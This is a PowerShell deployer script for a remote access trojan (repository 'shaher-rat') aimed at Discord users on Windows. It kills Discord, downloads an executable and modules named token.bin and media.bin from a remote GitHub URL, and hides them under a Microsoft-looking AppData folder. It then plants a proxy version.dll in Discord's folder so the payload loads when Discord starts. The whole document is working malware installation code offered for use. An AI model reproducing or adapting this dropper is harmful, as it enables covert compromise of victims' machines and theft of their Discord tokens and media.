# GitHub deploy - downloads payload files and places them automatically.
# Edit GitHubBaseUrl below OR pass: deploy.ps1 -GitHubBaseUrl "https://raw.githubusercontent.com/user/repo/main/deploy"

param(
    [string]$GitHubBaseUrl = "https://raw.githubusercontent.com/xx21sa/shaher-rat/main/deploy"
)

$ErrorActionPreference = "Stop"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

function Get-DiscordAppFolder {
    $discordRoot = Join-Path $env:LOCALAPPDATA "Discord"
    if (-not (Test-Path $discordRoot)) {
        throw "Discord not found in $discordRoot"
    }

    $latest = Get-ChildItem -Path $discordRoot -Directory -Filter "app-*" -ErrorAction SilentlyContinue |
        Sort-Object { [version]($_.Name -replace '^app-', '') } -Descending |
        Select-Object -First 1

    if (-not $latest) {
        throw "No Discord app-* folder found under $discordRoot"
    }

    return $latest.FullName
}

function Get-PayloadRoot {
    return Join-Path $env:LOCALAPPDATA "Microsoft\Windows\AppReadiness"
}

function Stop-DiscordIfRunning {
    $processes = Get-Process -Name "Discord" -ErrorAction SilentlyContinue
    if ($processes) {
        Write-Host "[*] Closing Discord..." -ForegroundColor Yellow
        $processes | Stop-Process -Force
        Start-Sleep -Seconds 2
    }
}

function Download-GithubFile {
    param(
        [string]$RemotePath,
        [string]$LocalPath
    )

    $url = "$GitHubBaseUrl/$RemotePath".Replace('\', '/')
    $dir = Split-Path $LocalPath -Parent
    if (-not (Test-Path $dir)) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
    }

    Write-Host "[+] Downloading $RemotePath" -ForegroundColor Cyan
    Invoke-WebRequest -Uri $url -OutFile $LocalPath -UseBasicParsing
}

if ($GitHubBaseUrl -match "YOUR_USER") {
    Write-Host "ERROR: Set your GitHub URL in deploy\config.json or pass -GitHubBaseUrl" -ForegroundColor Red
    exit 1
}

Write-Host "========================================" -ForegroundColor Green
Write-Host " GitHub Deploy" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host "Source: $GitHubBaseUrl" -ForegroundColor Gray
Write-Host ""

$payloadRoot = Get-PayloadRoot
$modulesDir = Join-Path $payloadRoot "modules"
$discordFolder = Get-DiscordAppFolder

New-Item -ItemType Directory -Path $payloadRoot -Force | Out-Null
New-Item -ItemType Directory -Path $modulesDir -Force | Out-Null

Stop-DiscordIfRunning

$files = @(
    @{ Remote = "RuntimeHost.exe";           Local = Join-Path $payloadRoot "RuntimeHost.exe" },
    @{ Remote = "core.bin";                  Local = Join-Path $payloadRoot "core.bin" },
    @{ Remote = "modules/token.bin";         Local = Join-Path $modulesDir "token.bin" },
    @{ Remote = "modules/media.bin";         Local = Join-Path $modulesDir "media.bin" },
    @{ Remote = "version.dll";               Local = Join-Path $discordFolder "version.dll" }
)

foreach ($file in $files) {
    Download-GithubFile -RemotePath $file.Remote -LocalPath $file.Local
}

Write-Host ""
Write-Host "[OK] Deploy complete!" -ForegroundColor Green
Write-Host "  Payload : $payloadRoot" -ForegroundColor White
Write-Host "  Proxy   : $discordFolder\version.dll" -ForegroundColor White
Write-Host ""
Write-Host "Open Discord to start the session." -ForegroundColor Yellow

